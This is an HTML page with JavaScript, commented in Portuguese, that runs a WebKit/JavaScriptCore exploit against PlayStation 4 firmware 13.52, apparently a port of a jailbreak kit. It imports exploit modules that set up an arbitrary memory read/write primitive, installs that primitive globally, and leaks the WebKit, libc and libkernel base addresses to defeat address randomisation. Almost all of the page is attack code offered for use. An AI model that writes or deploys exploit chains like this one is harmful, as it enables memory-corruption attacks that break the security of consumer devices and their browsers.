<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS4 13.52 — Slopkit Port</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a1a;color:#00ff88;font:13px/1.6 'Courier New',monospace;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;margin-bottom:4px}
#fw{color:#666;font-size:11px;margin-bottom:14px;letter-spacing:1px}

#sb{width:100%;max-width:700px;background:#111118;border:1px solid #1e1e2e;
  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0}
#dot.r{background:#f0a500;animation:pulse 1s infinite}
#dot.ok{background:#00c853}
#dot.e{background:#ff4444}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
#st{font-size:12px;color:#bbb;flex:1}

#con{width:100%;max-width:700px;height:340px;background:#050508;border:1px solid #1a1a2e;
  border-radius:6px;overflow-y:auto;padding:8px 10px;font-size:11px;line-height:1.6;margin-bottom:10px}
.l{padding:1px 0;word-break:break-all}
.li{color:#5b9bd5}.lo{color:#00c853;font-weight:bold}.lw{color:#f0a500}
.le{color:#ff5252;font-weight:bold}.ld{color:#444}.la{color:#bd93f9}
.ls{color:#00c8ff;border-top:1px solid #1a1a2e;margin-top:5px;padding-top:5px}

#cards{width:100%;max-width:700px;display:none;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:10px}
#cards.v{display:grid}
.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
.card .cv{font-size:12px;color:#bd93f9}
</style>
</head>
<body>

<h1>PS4 WebKit Exploit</h1>
<div id="fw">13.52 — Slopkit Port</div>

<div id="sb">
  <div id="dot"></div>
  <div id="st">Inicializando...</div>
</div>

<div id="con"></div>

<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libc Base</div><div class="cv" id="c-lc">—</div></div>
  <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv" id="c-ct">—</div></div>
</div>

<!-- ════════════════════════════════════════════════════════════════
     CARREGA OFFSETS GLOBALMENTE (padrão slopkit — NÃO é module)
     O 13.52.js define OFFSET_wk_host_constructor_candidates etc.
     como variáveis globais, acessíveis pelo module abaixo.
     ════════════════════════════════════════════════════════════════ -->
<script src="./13.52.js"></script>

<!-- ES Module: importa int64, core, mem -->
<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';

/* ─── UI ─────────────────────────────────────────── */
const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');

function log(msg, cls='li') {
  const d = document.createElement('div');
  d.className = 'l ' + cls;
  d.textContent = msg;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(msg) { log('=== ' + msg + ' ===', 'ls'); }
function setStatus(msg, state='r') {
  $st.textContent = msg;
  $dot.className = state;
}
function setCard(id, val) {
  const el = document.getElementById(id);
  if (el) { el.textContent = val; el.style.color = '#00ff88'; }
}

/* ─── int64 helpers ──────────────────────────────── */
function i64n(a) { return a.hi * 0x100000000 + a.low; }
function n64(n) {
  const hi = Math.floor(n / 0x100000000) >>> 0;
  const lo = (n - hi * 0x100000000) >>> 0;
  return new int64(lo, hi);
}

/* ─── MAIN: leak de bases (método slopkit) ─────── */
async function main(p) {
  logH('LEAK DE BASES');

  const ctorRaw = globalThis.__ps5NativeCtor;
  if (typeof ctorRaw !== 'number' || ctorRaw <= 0x100000000) {
    log('[-] __ps5NativeCtor não disponível', 'le');
    setStatus('Falha: __ps5NativeCtor indisponível', 'e');
    return;
  }
  const ctorPtr = n64(ctorRaw);
  log('[+] __ps5NativeCtor: 0x' + ctorPtr.toString(), 'lo');
  setCard('c-ct', '0x' + ctorPtr.toString());
  document.getElementById('cards').classList.add('v');

  // Acessa offsets globais definidos pelo 13.52.js (script src)
  const candidates = globalThis.OFFSET_wk_host_constructor_candidates;
  if (!candidates || !candidates.length) {
    log('[-] OFFSET_wk_host_constructor_candidates não definido', 'le');
    log('    Verifique se 13.52.js foi carregado antes deste module', 'lw');
    setStatus('Falha: offsets não carregados', 'e');
    return;
  }

  let webkitBase = null;
  let matchedCandidate = null;

  for (const hc of candidates) {
    if (hc === 0x00000000) continue;
    const wb = ctorRaw - hc;
    log(`  candidate 0x${hc.toString(16)} => base=0x${wb.toString(16)}`, 'ld');

    if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
      webkitBase = n64(wb);
      matchedCandidate = hc;
      log(`[+] Base validada! candidate=0x${hc.toString(16)}`, 'lo');
      break;
    }
  }

  if (!webkitBase) {
    log('[-] Nenhum host-constructor candidate validou', 'le');
    log('    Verifique OFFSET_wk_host_constructor_candidates no 13.52.js', 'lw');
    setStatus('Falha: offsets incorretos', 'e');
    return;
  }

  log('[+] WebKit Base: 0x' + webkitBase.toString(), 'lo');
  setCard('c-wk', '0x' + webkitBase.toString());

  // Verifica ELF magic
  try {
    const magic = p.read4(webkitBase);
    if (magic === 0x464C457F) {
      log('[+] ELF magic confirmado ✓', 'lo');
    } else {
      log(`[!] ELF magic: 0x${magic.toString(16)} (esperado 0x464C457F)`, 'lw');
    }
  } catch(_) {
    log('[!] Não conseguiu ler ELF magic', 'lw');
  }

  // Leak libs via GOT (se offsets disponíveis globalmente)
  const wk_memset = globalThis.OFFSET_wk_memset_import;
  const lc_memset = globalThis.OFFSET_lc_memset;
  if (wk_memset && lc_memset) {
    try {
      const lcBase = p.read8(webkitBase.add32(wk_memset));
      lcBase.sub32inplace(lc_memset);
      log('[+] libc: 0x' + lcBase.toString(), 'lo');
      setCard('c-lc', '0x' + lcBase.toString());
    } catch(e) {
      log('[-] libc: ' + e.message, 'lw');
    }
  }

  const wk_guard = globalThis.OFFSET_wk___stack_chk_guard_import;
  const lk_guard = globalThis.OFFSET_lk___stack_chk_guard;
  if (wk_guard && lk_guard) {
    try {
      const lkBase = p.read8(webkitBase.add32(wk_guard));
      lkBase.sub32inplace(lk_guard);
      log('[+] libkernel: 0x' + lkBase.toString(), 'lo');
      setCard('c-lk', '0x' + lkBase.toString());
    } catch(e) {
      log('[-] libkernel: ' + e.message, 'lw');
    }
  }

  // Mostra constants
  const baseN = i64n(webkitBase);
  const ctorRva = i64n(ctorPtr) - baseN;
  log('', 'li');
  log('// HARDCODE CONSTANTS:', 'lo');
  log(`const WEBKIT_CTOR_RVA = 0x${ctorRva.toString(16).toUpperCase()};`, 'la');

  setStatus('Bases encontradas ✓', 'ok');
  globalThis._exploit = { webkitBase, ctorPtr };
}

/* ─── BOOT ─────────────────────────────────────── */
(async () => {
  log(`UA: ${navigator.userAgent.slice(0,80)}`, 'ld');
  const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(navigator.userAgent);
  log(`Firmware: ${fwMatch ? fwMatch[1] : 'desconhecido'}`, 'li');
  log('', 'li');

  setStatus('Executando exploit JSC...', 'r');
  logH('EXPLOIT JSC (core.js)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent(tag, det, att) {
        const v = ['PAIR-REPROVED','PAIR-COMMIT','PAIR-WIDENED','PAIR-CELLS',
          'PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER','PAIR-MAIN-RECORD','PAIR-RELEASE'];
        if (v.includes(tag)) { log('  ' + tag + ': ' + det, 'ld'); return; }
        const ok = tag.includes('UP') || tag.includes('OK');
        log('[' + tag + '] ' + det, ok ? 'lo' : 'li');
      },
      maxAttempts: 0
    });
  } catch(err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'le');
    return;
  }
  log('[+] Primitivo JSC estabelecido!', 'lo');

  logH('PRIMITIVA R/W (mem.js)');
  setStatus('Instalando primitiva R/W...', 'r');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent(tag, det) { log('  [mem/' + tag + '] ' + det, 'ld'); }
    });
  } catch(err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'le');
    return;
  }
  log('[+] R/W arbitrário: window.p instalado', 'lo');
  window.p = p;

  await main(p);
})();
</script>
</body>
</html>
